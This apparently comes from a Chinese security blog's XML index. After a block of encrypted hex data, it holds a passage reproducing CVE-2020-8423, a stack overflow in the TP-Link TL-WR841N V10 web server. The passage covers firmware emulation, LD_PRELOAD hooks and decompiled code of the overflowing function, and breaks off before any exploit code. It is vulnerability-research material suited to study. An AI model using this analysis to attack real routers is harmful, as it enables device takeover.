9accb83d1f06ecc0f6f3fae0526bbbc881bd99aa01c9fd355ed4f1cf290f891c6f202adc0be12a2972a6b8ec4358ef238f1ee6e720b2148284ae1333dc7f51f48c46662ec2e7e7e00f090bf1e1e757d10c3963a9ad50a1b35cdbaead1da57ca2434d9a8e71a3cc73c4787b9c764e4831a5a38f7108c98c24e7acf686aaa1966670ef44c9a134b68af6c1fa10ddfba082f0dc6ebc1e64d03342752e0c9562dd628f25336ef9485e19bcd721858dd9b7b83f5e553ff33daca1a143613dc7e1ad0c6ee269889d765ecb5a714019cd2770dad653a49e0be7fca5637a80549e2a741c6c74f83c3b6aee84e815278a8b960278d3a8e0348d3fc71687baed92bbfe2ece4ec9eefb167796b3698b9dcb910e1911af7b80ba59e6c1914dafe6e454e8fdd010d6cc7a67352decd28aeed4823a4c44a85115cb871665b34bbb1e5a5bdd4ecab1f33e362d5f01a821d1064bc81ea7e4aa424f1cf9de0b9cfcba5ebf950d05c950568950853a774e55dc520b2aec985725b50d3224ce92d4b9ad5b71f0c3a9ee7fa0bf24bf643b0ce0dea71396a22b2644f4cd2a62691539a74ee8fea81f6ab52dd5d5e9630da468e1c299d03814ef19e8015702a788d9e640accaf2c50641dfc1ad554a32d307a7384bb69c84bf6f44b87fef38583bb1c3c261de7b836f487f6b4d40810b0980975182a6e025eda0ea1aef05d6a516959816178887d5fe24d8e26966322fd2b370a9f599aaf7be32eab67e210fb5d4348529877634af4ad404d79f4a9f4f7ab19ed6747932b984e9ddbbbed63fe67f9b5efda58e5ef28fea9612f98127a47c43d068ac85b7c0ce09751efc8bce2b4efcb97e01267daf3dba1c6dc74b27331e7ba33b8dd5005e57ae1131b4a6ec851ed57bc691208b85a8b93deeb466204252f83044dce61245fd6ef69fc2151236a3d716bd61f6816add91d30b15cb7e6cb26b9110f29b146bbd807b5cf86b289ae8314afe07a10994789a395ef0a09471d9cd98578fefa60090232ffcc7e2e34be0d8e100acc9d0791e2a6538a18d3df0545aecdc23c6ceb479b70f5d5f9b9668b24d544007bd7786f4abced3a5bcaed3a499cf269ef2592f41de05d115a1747ca89e1631dc8ca88173cc5f0a49f07520a718223d7b9d56834de04709f3b0290ff68861965c2806b69d23814ce196c8032b6e45b86b74270c3fd34f7fc0b61ba14352cd7e6664014d5338c588c6d82a0c0a0064c376d7b2ff15853393be87be46ad055703867812d2ebf88a28ee067d5f4e612d453ecd45aff98d596b3666c88e0c2f0c168702cf62a07dd272045cd26115c6afc0c01b1c3f53424cd92b8551568ca2944a9c9f021cb92a0a8eb9de8ffc0ba6b7f93ee32b67223e89e1fc51ede3df4b458bcf479441e28b2a34316a486cf7916138b1093019b886f0cf31f10e4498607b431f5d145125dd64b990410718f19603658a2e4d04ab0f2b82783c1a9a5e93d9e9c0d9cf3ef22ac43851fff80d1d634e4299ef9558dc0ecf5474133352576028afe49dce857323c69b6fb7e8fe7a14c2d499e34d9bcea9aac3703a0493071cfe760c0f141d89eb4450a084d25bdc3bad91c5091e496fbb55c2c92b47b22ce06bc4194ddeba0cc514ba7cd2153c9294e4a675f808480c3c4111ee30e0f32adcdbb093d1bb8c3e72288cd3b6a331854cfb4cb6066de2b65c3238307c0f116155cb665591d8f210b152fc34d8fdd5ebda31f5c3209783e0fd1ce86a5a673d027ef3fb1510d533cb49f20b851a3978fbbf6a98c9f44a88b5e1d9c629154d3b6563446eccdbb5bc56fe997801f336201965fe7310e64415315e569a7698a163571145291d4e03606501f4376108c77d445cf123e051e887bfe4d8cf6026ef56e899e756e8c8d2f786272aaa7b70a6f15238862a39e4291e424ef154bbbe9cf84360ff9725ecc27c6ccfdf8172631a8274190cdf82324750e836f4cbd5e62ee9e0e5d285bb554846d3975d4bc8ca0d6d65f44ae93863018b6e6f15267da796b903936740b74478daaeb1ffd3ada87be0d3f82cdd8e54fb97919fcf9aa2c6f77f0f3dd0212771b1a749afe1605c5b2102e96a7fd742b708bd390db39ec1e9f3e9baf031f20cd8b46021d1a066df7dd0f994d2a49abc87d80a757c4084edac914b39508243c836d2a099aba859f98e2aa1d1f593fcb0d86b151a10319061274118cc1751e3a197b10d2f6e85c84ceee4ebe0df790763ed37730d9542e656bdcc9b2193f81e9da3690c178b03c0924ef5e9b58320b4114358568db4b9d9855397f069c2517fb4d90cf36203a64c587b2f4c029b7b80361509370da40eb38e7ac197e6212f4051d1d7a74467995c2b12317e4cba346400fa62acc29d927a6bde2480963ac91723561a777d5846726c4232e178ad194770eff0fd3697ecbe36312be05162549fcc47f0271f6b16100a09a854f390b82993b79fd80736ed1ae79bde759d8fb0760311eb07cd9b48d15fc2610faaa6555def25bd9c616587be41e3cf9847c7790397d7d52f985a5bb3722466058155cb1191f321e92b660e3e2481aea353a69e1a557078b6d3ead7df01196c8edbd7b7e5ef43a7860cce62612d6805a83fe25cbdb4e95c6eeccbdc92283036bc3cbdc121cbfdd2517d67e4c21d57900fe5c08389a466d12fcd3b9dc81eb3f0d833d8a93905e77abb0c152ffdb1f3815d5cf5e5a43dfa873c10118420c8f7c53cc90413d2b0486fa37144568589d7bb5c440742fefacf822e96d4778663e6d4fe6a8418477a5f416e2770b22098bb95b663e3445daeb0295a4d2cdbbb65dcf1070fef3faa28caac49f8fabf3d6c2a36202e6665f50e7624f110f334a22ae62a86a71d4340a01829a89be9f57317a5b96aca78704898d8c63c02c930e7eeeae94a4ce155ee110060466540d06b0ce9ed63d20e856d27e5bcb5b0350fdfa0d2ddc60c290fd2a5e0770e676d92ea91b935059b8f74fa3a08b4a5945660bcc118d316acd0477d55c6cc8b4be91fee416c304e1c94885afaecdca9919fbccd5bd45abe740928749be983ebd85a458bab7a351ef8dcc3827c12bc8315437b77452ddb761c4cd7f60ad573a7032aec6be656d8c2491faa476174db13447d85c05491069695f4d2515cf3739cd14d4fe8ad17d58b5e1b0b0c48d56847a4214af7183a36e19ef06bdd0f200ceb5c7995fcbe511b4810b791e6c56986ae1c7b0d89505dcbe84ccdf6854b91012403bcdfa60ec5337476c3425c967b25653a8dec8b44398c9d271dc43b060f5ca4df4964994dcf2bbe3e68b1e47f399c44e03456bfb7859d04d6d7d6dff8918c6bab3e45ace0c0bf1893e4066164732c14761ed03e0ecb625e38fb6fa296bb68fe2fe7488a6d67b7e4528df3890b1753aed7e5bdd21ac3bf8450661727d42a20cbde91a8dc996fe6273181b956a59d6261812a79cb26e13cab20030e7432b181529a1eac7bed237f210f6676421ac105383bc62e65529938eb9cca15546ddfc585f206e2ac34e60c8d451073cef3a1343f9c5c578fb862fb1c7cb42c284f75a20a66b23e4a0bf9a53e108602e82e4ec226a4b740e0b99423818d23e7572fe3565de3251fed3aef44f12ef41fc79eeddc88f88d9c576584b9b3745fbce64ec756d718bfa64f767585a3db77dde7918f367135337949ed9d8af0499696a1bac78fcffb4a606ead06c94d1b2a4ca09def422952a5a32599a44c5da64248b627ca086562e3bcdadb5a32ef851c57e4e5c5b99449d3a9d4f3f02e3243dacaa3fbe25376d89c2ed84d8976a71d48ca023539c105fd716406fabd3f682c9d5d32163abd118eef9faf11c6cb475af7ff875430cba4106882b7dc6dd57175678bd196291154f5b5039a54d481add96111289ffb0b64d3a4af4f8978f2964a9953af26f937089bbd5bb99ddeaa1f710c3725444cc04436021ffe23457c6a02da1017515e58e7258bf95b5bf4256c1dd637a1665cb1afd43aa0a4fe8030f1e4a5fc09969906e4ad622850ac00ec996b03f284d097d64fbd212ed0e6ef420d04fdc169f67f11f0fb6423ffc42088c16d6f680c805e5781288420adea97e35678504ae585f964683ba554fecf630c3372a28913993cd6bf7a8ceb5d084d0dcd7b725106b009451bf1b2cc334b036afe7f80d44ed27597a9682cbb082f634ef60a48013101928a9c009a0551c881f264e3f5e6a443fcc4d2994261a9de137072b6078bd11c712a749d0d94739a0134ecbc5add1237e60ed53113a0dd123ea816c7ff73eb1bb354dcbd3615998d1ef6fb99dd2b6f1464d5c73afe9abe3cbf7db133dc718862b93ce4e5c73098020167068ef29a4eea8d8bf32c7d57c68e65951f5719d0ca574e1c9430ff9a51783de5480a668cfdf36f40e139b5b1a4a2f0482015f8bf147e3e0a5413bc077cc9ba07ef512d0a21430a2fba279d5e7cee5d340876241ebccb5658381fb11477949caa8600ca9e04548c7827b6d800985743bcba05de50ce74d9346ac95e7455a0c3902824394b8d699cd4b9856dbe08788c64cd2deafcb78074d63f19764eb6d6dd630d089fbd38f8f59e02dfca254602ca1020b5ab716bb1ff6e4014f720a03423a92fb448fd46dad304b010adc35e8ad85543cea8b6c43c2116d696804561f336851cd4fdf06cc2e0597a56446dbdcc7c82d67c55753b403ca08af1f2ff23b373b740a3c6f752950af530b3e592c33581f6ef0e9adf0e4e1b16c1a711c1ab9ef1ba975ec7bb95424a152347d59cf4970738dfacd945a7c77d608318c7430828d3209f476f75972f7a6ce7091d5de748c39959d521aa76beecf204c7939c8add0015e800e5090c194cb957ea65b289f87c10cd099fb39c2836ebbf569ceaa99c0b825666eecb778a9b96b04063274b3688230afb376f3e114b6b7bad9c6c093ce76645a93ddaab33b2857878b79cd8b4a6f539cd9801420a31d2701655202d81e08e26280e0871f8e073d76b9ad43e629abd344c027722d90a3a5ffa189cce872e080d656c6cc2b0fa27bb8007fccf73bb1ae008b553faa8abb1c234adaf1aeaf7eb381e7fb6b6926e03f190af8eb3b7215e202fb80276de88fef71b1af2f638a0fb05c2a16ecb05f752ab681d0a6eb3f658c706cb4433e80877808cce6489149a24bfb5193db42452094e0c728c03cdbf7eeae3ac1196f334779ec72b7eabdf7a53971ccdd53e8ec6dd7c35cb772b6ea9088de46c297f379f86419012f2a02b32614d6b2aef2a4fef5010954bbdcf44e8fd36d682fa2f1db6e039b89a6ed4d8c5915eded80c7c593c79c3ef6a0a83d0a8c435f1a4a3b2f385780c2cedf0cdebde022461535c0e69dca81427d9866e3bed5683e89547f9fe83edfcecb9141152f13c1a4133a82f5c1770d7ffdffd13d7149c8c11da9b280607915edde3dcf38d4489c09eab2418b0ce0f2a28a12b3c81eed73e77fbc6af5b6f60c673947c8187186fccbc46aa7a8d348ac7eda520ca6bb26985ba12a134e5a2955562eb3ae0e5ba0a97daa4a0d9ad87cc4001c05665a4b6fa2cc663e2a24e163dd1c7316f603dc105857d8bcc46110479fa3959074c55f00e316d66c567209d1261d288cd4337904c7ed40af044851e518d763529a94b5af26eb4c41ee4eccc10968ea6de009b3079404b8f3a9efed5c375b3663db0212091abf5803c147e8a3654c965f94afe51c9b00465041eb93ac56759b942f61dd204f8159ca0cdedaac3b10b93bb5506c9386359f3575bea2f77abd29823fb80a8afa912a4c35d564f417ec2c9fcb1b4820d62e2bf72ab05d8b600277cf820ebb2215e3d0e4fee72b3e9ef884e1a99d91c74ba0e9d70fe28a780cd993dd3cabeec2fd5b3c6bad0dfef9bd4c42cfd7d3d5a022dfbabc321b64f16d853e4f6916a708d6dbaf47fda09d515b387193ad12589eef462c353d835a7aaf934fd369234dc9b390eefa7fb7947dbbf83189693748a9212c49d607488fe7f75f64209341d3762e6e87b97bf5a5be8cea29fbeddb8a26cb6d5ea625f8c275f21376a4f315dcd3798fcbd575f8b3318ea19336b0385fb485d21728b2e107f6ba2bacb459b78f03f020d5c51795f95d5f35f63489ae1483a1230aadac454cbc7ad50dff662e32506222e0dc31096b43477feee401f6a1f1701eb551d2bbe556bbcf72ef0269b6da58b0cc2c9566240c5ea865e39d66d41d985f23c29d5f9c30030202e325a93bec847fd6998151de4bcf0ed18f0b3f91d78f02c9bca1d133c368cfb4bbae6817055c17bfdad8ee60b9997d91abdb7b76ae6317c7ca03ced3e7071b089c88f601c1d9344d6bac3c531d07ee9fe84fb2b69c24539cbcacb68f7dd73d9e60b23c245244a055f3ae7cbcdaf8acf264b1f810812b1e626505995b14896f894d2886147fef2cba08fdc4b58855902ca6562ac51b82150fd538053eb7f81cb9ce783154c1ae29271353dc1254cf7fa3282d6ea8b5d43a52646911fc14722269890eafa2fbae242ef3924070e46acde4e2328ab8f3a8cc1e685cbcddf5de510c307eeb8d522dba2deadccb51002421ba3aea63f816630f935bd2a06f7fd5d9e197e1756b4d135165bff99fabb95b3544e8cd42290fc04bb8bc58e77f8b96c913361e0196c3e37941762160479132ebf5fa381d95fa96de04d7c5183e0a1783525d21aa67b5a7a85285d277577bf34cc4bac5e424bebd90ad96d89647b93f766d68205a9cf26e888129d4b19799a0a18cc74b9830c545312c8d8199839384c7dff465d662d7063f16b20bdecad62ab47ae8ff1c44178052e02b33a33b83e0181ead0f4fb50d75b4713f5bd78534775cfed4c3108d7694dc2312cb95c802729eebac51bc24819702f797aca3781071fc549925932ca9db1ba14be0b1b5fd477ed0fbb6b702d2c7e24c52bcfbe04f8cb89efbd6fb21870afc203ee47fbd38dad252e15234168a11116d4fa3267734532197765bcccfbca30d7ccada6c4790fa13dfeeaf59c40100ec74110f2603394b0bda45dc06c61afd8e6696fddd0d44caae0e80480763b161f137ed3419400c160334b2d8ea7bdd28ce49ba158e3ab856bb3832d17b962b18f338f75631b7de864cead90f4c6a154aab535c7f399409c761d89d6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="archives/0/"/>
      <url>archives/0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.mrskye.cn/archives/e77640bd">https://www.mrskye.cn/archives/e77640bd</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-8423栈溢出复现</title>
      <link href="archives/e77640bd/"/>
      <url>archives/e77640bd/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这个漏洞复现学习到的姿势点挺多的：</p><ul><li>通过 hook 关键函数修复固件运行环境</li><li>编写 shellcode 的指令逃逸</li></ul></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞编号：CVE-2020-8423</p><p>漏洞描述：httpd获取参数时的栈溢出导致了覆盖返回地址shellcode执行</p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p>漏洞设备固件版本：TP-LINK TL-WR841N V10 。</p><p>国内站点没有 V10 版本固件，美丽国情况一样，换去加拿大站点找到：</p><p><a href="https://www.tp-link.com/ca/support/download/tl-wr841n/v10/">https://www.tp-link.com/ca/support/download/tl-wr841n/v10/</a></p><p>这里记录一下国内 tplink 官网上面的固件和国际版本有点区别，binwalk -Me 出来是很多压缩包，用的是 <strong>wind river 系统</strong> ，需要进一步处理才能提取到二进制文件。</p><blockquote><p><a href="http://www.tearorca.top/index.php/2020/05/13/tp-link%e4%b8%adwind-river%e7%b3%bb%e7%bb%9f%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90%ef%bc%88%e5%8d%8a%e6%88%90%e5%93%81%ef%bc%89/">http://www.tearorca.top/index.php/2020/05/13/tp-link%e4%b8%adwind-river%e7%b3%bb%e7%bb%9f%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90%ef%bc%88%e5%8d%8a%e6%88%90%e5%93%81%ef%bc%89/</a></p></blockquote><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><h3 id="attify-模拟"><a href="#attify-模拟" class="headerlink" title="attify 模拟"></a>attify 模拟</h3><blockquote><p>测试 attify 能不能仿真而已，与复现初衷不一致，所以没有采用这种方法，最后采用方法在第二小节</p></blockquote><p>试了一下用 attify v3.0 FAT 能成功模拟起来，用 ssh 转发流量就能在主机上设置代理后就能访问到：</p><blockquote><p><code>ssh -D 7878 iot@192.168.211.9</code></p><p><a href="https://blog.csdn.net/weixin_43252204/article/details/110354852">SSH流量转发的姿势</a></p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210405231004.png" alt="image-20210405231003458"></p><p>burpsuite 访问就在 user options 打开 socks proxy 设置代理 127.0.0.1 7878 ，浏览器代理更换为 brup 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210417111205.png" alt="image-20210413172146367"></p><p>但复现这个漏洞是为了学习 hook 函数修复固件运行环境，所以还是放弃 FAT 模拟，选择用 qemu 系统模式模拟运行。</p><h3 id="qemu-模拟"><a href="#qemu-模拟" class="headerlink" title="qemu 模拟"></a>qemu 模拟</h3><p>mips 大端程序，自动到 <code>https://people.debian.org/~aurel32/qemu/mips/</code> 下载内核与磁盘文件。</p><ol><li><p>创建虚拟网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.0.2/24 up</span><br></pre></td></tr></table></figure></li><li><p>启动虚拟机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure></li><li><p>设置虚拟机网卡 ip </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.0.1/24 up</span><br></pre></td></tr></table></figure></li><li><p>将固件的 <code>squashfs-root </code>文件夹传输到虚拟机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.0.1:~/</span><br></pre></td></tr></table></figure></li><li><p>在虚拟机中挂载 <code>dev</code> 和 <code>proc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br></pre></td></tr></table></figure></li><li><p>启动 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot squashfs-root sh</span><br></pre></td></tr></table></figure><p>启动固件 web 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./usr/bin/httpd</span><br></pre></td></tr></table></figure><p>能运行起来，启动后新建了一个 <code>192.168.0.1</code> 的网桥，重新修改 eth0 ip 之后无法访问 web 界面，接下来 hook 函数修复运行环境。</p></li></ol><h3 id="hook-修复运行环境"><a href="#hook-修复运行环境" class="headerlink" title="hook 修复运行环境"></a>hook 修复运行环境</h3><blockquote><p><a href="https://ktln2.org/2020/03/29/exploiting-mips-router/">https://ktln2.org/2020/03/29/exploiting-mips-router/</a></p></blockquote><p>hook system 和 fork 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HOOK:system(\&quot;%s\&quot;)&quot;</span>,command);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure><p><code>LD_PRELOAD=&quot;/hook.so&quot; /usr/bin/httpd</code> 运行起来可能报错缺少 libc.so.6 ，需要在固件 lib 目录将 libc.so.6 连接到对应 so 文件：</p><blockquote><p><a href="https://www.anquanke.com/post/id/203486">复现文章</a>中提到可能还会缺少 ld.so.1 ，复现时没有遇到，如果提示缺少一样链接到对应 so 文件即可</p><p>后面换成用 buildroot 的交叉编译链编译的 hook 文件就没有出现这个问题</p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406105358.png" alt="image-20210406105356493"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//path: /squashfs-root/lib</span><br><span class="line">ln -s ld-uClibc-0.9.30.so ld.so.1</span><br><span class="line">ln -s ld-uClibc-0.9.30.so libc.so.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406113730.png" alt="image-20210406113729257"></p><p>再次运行之后可能会遇到报错 <code>SIGSEGV</code> ，经过排查和其他师傅提到过的可能是 apt 安装的交叉编译链 <code>mips-linux-gnu-gcc</code> 不完善导致编译的 hook.so 有问题。换成用 buildroot 编译安装的 <code>mips-linux-gcc</code> 的 hook 文件，问题解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//path:~/buildroot/output/host/bin</span><br><span class="line">./mips-linux-gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="string">&quot;/hook.so&quot;</span> /usr/bin/httpd</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>问题在 <code>stringModify()</code> 这个函数，这个函数是对 <code>&lt;&gt;\/</code> 符号进行添加转义符 <code>\</code> 的操作；将前一个为<code>\r</code>或<code>\n</code> 后一个不是 <code>\r</code>或<code>\n</code>的字符串替换为 html 的换行 <code>&lt;br&gt;</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">stringModify</span><span class="params">(_BYTE *dest, <span class="keyword">int</span> len, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// dc</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// $a3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)(a3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(v4 - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*(v4 - <span class="number">1</span>) || v5 &gt;= len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="string">&#x27;/&#x27;</span> )                            <span class="comment">// /==\\</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;&gt;&#x27;</span> || v7 == <span class="string">&#x27;\\&#x27;</span> )            <span class="comment">// &gt;==\\</span></span><br><span class="line">                                                <span class="comment">// //==\\</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">        *dest = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">LABEL_19:</span><br><span class="line">        ++v5;</span><br><span class="line">        ++dest;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="string">&#x27;&lt;&#x27;</span> )                     <span class="comment">// &lt;==\\</span></span><br><span class="line">      &#123;</span><br><span class="line">        *dest = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">      ++v5;</span><br><span class="line">      *dest++ = *(v4 - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;&quot;&#x27;</span> )                          <span class="comment">// &quot;==\\</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = *v4;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="string">&#x27;\r&#x27;</span> &amp;&amp; v6 != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(dest, <span class="string">&quot;&lt;br&gt;&quot;</span>, <span class="number">4</span>);                 <span class="comment">// \r、\n替换为&lt;br&gt;</span></span><br><span class="line">      dest += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">LABEL_21:</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *dest = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题就出在 <code>\r</code>或<code>\n</code>的替换逻辑上，原来 1 字节被处理为 4 字节。</p><p>交叉引用向上查找到上层函数 <code>writePageParamSet()</code> ，传入 stringModify 用于存放处理结果的是一个 <code>char v8[512]</code> ，是一个栈上的空间，writePageParamSet 是一个非叶子函数，返回地址存放在栈上，存在栈溢出的可能性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a1 ： html 输出内容存储变量</span></span><br><span class="line"><span class="comment">//a2 ： 格式化字符串</span></span><br><span class="line"><span class="comment">//a3 ： ssid </span></span><br><span class="line"><span class="function"><span 